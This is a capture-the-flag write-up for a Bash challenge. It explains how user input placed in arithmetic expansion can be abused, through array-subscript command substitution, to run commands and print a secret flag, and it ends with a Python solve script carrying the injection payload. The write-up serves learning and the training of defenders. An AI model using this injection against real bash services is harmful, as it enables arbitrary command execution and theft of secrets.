@@ -1,0 +1,102 @@
+---
+title: 'Daily Alpacahack 2026 - The World'
+description: 'Writeup for The World from Daily Alpacahack 2026. A Bash challenge involving arithmetic expansion injection.'
+date: 2026-02-06
+tags: ['writeup', 'bash', 'command-injection', 'arithmetic-expansion', 'alpacahack']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge
+
+We're given a bash service that asks two time-related questions:
+
+```bash
+#!/bin/bash
+set -euo pipefail
+FLAG=${FLAG:-"Alpaca{*** REDACTED ***}"}
+
+echo "[Warmup] current time (seconds)?"
+read t; d1=$(( t-$(date +%s) ))
+if (( -100 < d1 && d1 < 100 )); then
+    echo "Well done."
+else
+    echo "Hm. diff: $d1"
+    exit 1
+fi
+
+echo "[Impossible] current time (nanoseconds)?"
+read t; d2=$(( t-$(date +%s%N) ))
+if (( -100 < d2 && d2 < 100 )); then
+    echo "The World! $FLAG"
+else
+    echo "Hm. diff: $d2"
+    exit 1
+fi
+```
+
+**Stage 1** asks for the current epoch time in seconds with a generous ±100s tolerance — trivial.
+
+**Stage 2** asks for the current epoch time in nanoseconds with ±100ns tolerance — impossible to guess over the network.
+
+## Vulnerability
+
+> **Note**: I just learned about this technique of injecting commands via array subscripts in arithmetic expansion! It's a really cool bash quirk.
+
+The user input from `read t` is placed directly into bash arithmetic `$(( t-... ))`. Bash recursively evaluates variables inside arithmetic expressions, and critically, **array subscripts undergo full command substitution**. This means we can achieve arbitrary command execution through the input.
+
+The expression evaluated is:
+
+```
+$(( t - $(date +%s%N) ))
+```
+
+If `t` contains `BASH_VERSINFO[$(echo $FLAG >&2)]`, bash will:
+
+1. Evaluate variable `t` inside arithmetic
+2. See an array subscript and evaluate the index expression
+3. Execute `$(echo $FLAG >&2)` as command substitution, printing the flag to stderr
+4. socat is configured with `stderr`, so the output is sent back to the client
+
+We use `BASH_VERSINFO` (a built-in bash array) instead of an arbitrary name because `set -u` would cause an unbound variable error.
+
+## Solve Script
+
+```python
+#!/usr/bin/env python3
+import socket
+import time
+
+HOST = "34.170.146.252"
+PORT = 23758
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.settimeout(5)
+
+# Stage 1: send current epoch seconds
+print(s.recv(1024).decode())
+s.sendall((str(int(time.time())) + "\n").encode())
+print(s.recv(1024).decode())
+
+# Stage 2: bash arithmetic injection via array subscript command substitution
+payload = "BASH_VERSINFO[$(echo $FLAG >&2)]"
+s.sendall((payload + "\n").encode())
+
+try:
+    while True:
+        data = s.recv(4096)
+        if not data:
+            break
+        print(data.decode())
+except socket.timeout:
+    pass
+
+s.close()
+```
+
+## Flag
+
+```
+Alpaca{muda.sh}
+```
